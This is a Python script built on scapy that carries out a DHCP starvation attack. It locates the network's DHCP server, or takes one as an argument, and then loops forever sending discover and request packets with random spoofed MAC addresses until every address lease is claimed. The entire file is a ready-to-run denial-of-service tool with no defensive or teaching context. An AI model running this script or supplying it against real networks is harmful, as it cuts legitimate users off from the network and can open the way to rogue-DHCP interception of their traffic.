import argparse,subprocess
from scapy.all import conf, Ether, IP, UDP, BOOTP, DHCP, RandMAC, sendp, sniff,ARP,srp


def get_dhcp_server_ip(iface):
    pkt = (
        Ether(dst="FF:FF:FF:FF:FF:FF") /
        IP(src='0.0.0.0',dst='255.255.255.255') / 
        UDP(sport=68,dport=67) / 
        BOOTP(chaddr=RandMAC()) / 
        DHCP(options=[('message-type','discover'),'end'])
    )

    sendp(pkt, iface=iface, verbose=0)
    pkt = sniff(filter="udp and (port 67 or 68)", count=1, iface=iface, timeout=5)[0]
    if pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 2: 
        return pkt[IP].src
    return None
def attack_dhcp_server(iface, target_ip):
  print(f"Starting DHCP Starvation Attack on {target_ip} ...")
  while True: 
    mac = RandMAC()
    pkt_discover = (
        Ether(src=mac, dst="FF:FF:FF:FF:FF:FF") /
        IP(src='0.0.0.0',dst='255.255.255.255') / 
        UDP(sport=68,dport=67) / 
        BOOTP(chaddr=mac) / 
        DHCP(options=[('message-type','discover'),'end'])
    )
    sendp(pkt_discover, iface=iface, verbose=0)
    offer_pkt = sniff(filter="udp and (port 67 or 68)", count=1, iface=iface, timeout=5)
    if offer_pkt:
        
        ans = offer_pkt[0]
        offered_ip = ans[BOOTP].yiaddr
        print(f"Requested IP: {offered_ip} with MAC: {mac}")
        pkt_request = (
            Ether(src=mac, dst="FF:FF:FF:FF:FF:FF") /
            IP(src='0.0.0.0',dst=target_ip) / 
            UDP(sport=68,dport=67) /
            BOOTP(chaddr=mac) / 
            DHCP(options=[('message-type','request'),
                ('requested_addr', offered_ip),
                ('server_id', target_ip),
                'end'])   
        )             
        sendp(pkt_request, iface=iface, verbose=0)                



def main():
    argv_parser = argparse.ArgumentParser("""
usage: DHCPStarvationNEW.py [-h] [-i IFACE] [-t TARGET]

DHCP Starvation

optional arguments:
    -h, --help show this help message and exit
    -i IFACE, --iface IFACE
                Interface you wish to use
    -t TARGET, --target TARGET
                IP of target server
    """)

    argv_parser.add_argument(
        '-i', '--iface',
        help='Interface you wish to use',
        required=False
    )
    argv_parser.add_argument(
        '-t', '--target',
        help='IP of target server',
        required=False
    )

    argv = argv_parser.parse_args()
    iface = argv.iface if argv.iface else conf.iface
    if not iface:
        print("Unable to get default interface")
        exit(0)

    print(f"Searching DHCP server's IP address for IFACE {iface} ...")
    tar_ip = argv.target if argv.target else get_dhcp_server_ip(iface)
    if not tar_ip:
        print("Unable to get DHCP server's IP address")
        exit(0) 

    print(f"Checking: IFACE: {iface} | Target IP: {tar_ip}")
    attack_dhcp_server(iface, tar_ip)
main()